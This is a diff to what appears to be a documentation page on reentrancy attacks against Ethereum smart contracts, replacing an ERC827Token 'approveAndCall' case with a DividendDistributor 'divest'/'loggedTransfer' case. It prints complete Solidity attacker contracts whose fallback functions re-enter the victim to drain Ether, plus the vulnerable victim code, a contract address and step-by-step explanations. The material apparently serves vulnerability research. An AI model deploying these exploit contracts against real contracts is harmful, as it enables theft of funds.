@@ -4,27 +4,27 @@ Attack 03
 
 **Contract Name**
 
-ERC827Token
+DividendDistributor
 
 **Contract Address**
 
-0x2f55045439c0361ac971686e06d5b698952f89c1
+0x7bc51b19abe2cfb15d58f845dad027feab01bfa0
 
 **Transaction Count**
 
-5
+6
 
 **Invovled Ethers**
 
-0.85 Ethers
+1.6 Ethers
 
 **Length of the Call Chain**
 
-1 external function
+2 internal function calls, 1 external function
 
 **Victim Function**
 
-``approveAndCall``
+``loggedTransfer``
 
 **Attack Mechanisim**
 
@@ -32,23 +32,18 @@ Attack code:
 ::
 
     contract Attack{
-        ERC827Token e = new ERC827Token();
-        bytes  bs4 = new bytes(4);
-        bytes4 functionSignature = bytes4(keccak256("attack()"));
+        DividendDistributor d = new DividendDistributor();
+        uint bigamount = 1;
         constructor() payable {}
-
-        function prepareWork() {
-            for (uint i = 0; i< bs4.length; i++){
-                bs4[i] = functionSignature[i];
-            }
+        function register() public {
+            d.invest.value(10)();
         }
-
-        function attack() public {
-            e.approveAndCall.value(0)(this, 1 eth, bs4);
+        function attack(uint amount) public {
+            d.divest(amount);
         }
-
-        function() payable{}
-
+        function() payable{
+            d.divest(bigamount);
+        }
         function getvalue() returns (uint) {
             return this.balance;
         }
@@ -57,21 +52,62 @@ Attack code:
 Attacked code:
 ::
 
-    contract ERC827Token is ERC827, StandardToken {
-        function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
-            require(_spender != address(this));
-
-            super.approve(_spender, _value);
-        
-            require(_spender.call.value(msg.value)(_data));
-
-            return true;
+    contract DividendDistributor is Ownable{
+        struct Investor {
+            uint investment;
+            uint lastDividend;
         }
-    ...
+
+        mapping(address => Investor) investors;
+
+        uint public minInvestment;
+        uint public sumInvested;
+        uint public sumDividend;
+        
+        function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected
+        {
+            if(! target.call.value(amount)() )
+                throw;
+            Transfer(amount, message, target, currentOwner);
+        }
+        
+        function invest() public payable {
+            if (msg.value >= minInvestment)
+            {
+                investors[msg.sender].investment += msg.value;
+                sumInvested += msg.value;
+                // manually call payDividend() before reinvesting, because this resets dividend payments!
+                investors[msg.sender].lastDividend = sumDividend;
+            }
+        }
+
+        function divest(uint amount) public {
+            if ( investors[msg.sender].investment == 0 || amount == 0)
+                throw;
+            // no need to test, this will throw if amount > investment
+            investors[msg.sender].investment -= amount;
+            sumInvested -= amount; 
+            this.loggedTransfer(amount, "", msg.sender, owner);
+        }
+        
+        // OWNER FUNCTIONS TO DO BUSINESS
+        function distributeDividends() public payable onlyOwner {
+            sumDividend += msg.value;
+        }
+        
+        function doTransfer(address target, uint amount) public onlyOwner {
+            this.loggedTransfer(amount, "Owner transfer", target, owner);
+        }
+        
+        function setMinInvestment(uint amount) public onlyOwner {
+            minInvestment = amount;
+        }
+        
+        function () public payable onlyOwner {
+        }
+        ...
     }
 
-In this case, the goal of our reentrancy is ``require(_spender.call.value(msg.value)(_data));``. To reach it, we need to make sure the address variable *_spender* does not equals to the address of ``ERC827Token``. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.
+In this attack, we need to register the ``investors`` array first in order to guarantee we can pass the ``if`` condition in victim function ``divest``. We send ethers to the victim function to add some balances to variable ``sumInvested``. 
 
-**Preparation.** We set attack function's signature by calling ``prepareWork()`` function in attack code. 
-
-**Attack.** The attacker call ``attack()`` function, it calls ``approveAndCall`` function with the parameters setted by attacker in victim contract. The ``require`` condition is satisfied because the first parameter is attacker's address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
+The attack process starts with function ``attack`` in the attacker's contract. It transacts with victim contract by calling ``divest`` function. The ``if`` check doesn't work due to our preliminary efforts. The running process goes to statement ``this.loggedTransfer();`` and calls an internal function ``loggedTransfer``. In this function, it does transaction first, however, the transaction target and the amount rely on the function arguments without any check. The transaction operation will call the fallback function in attacker's code. That's why we set an ``divest`` call in there. Hence, a function call loop is built. We successfully achieved *Reentrancy* attack.
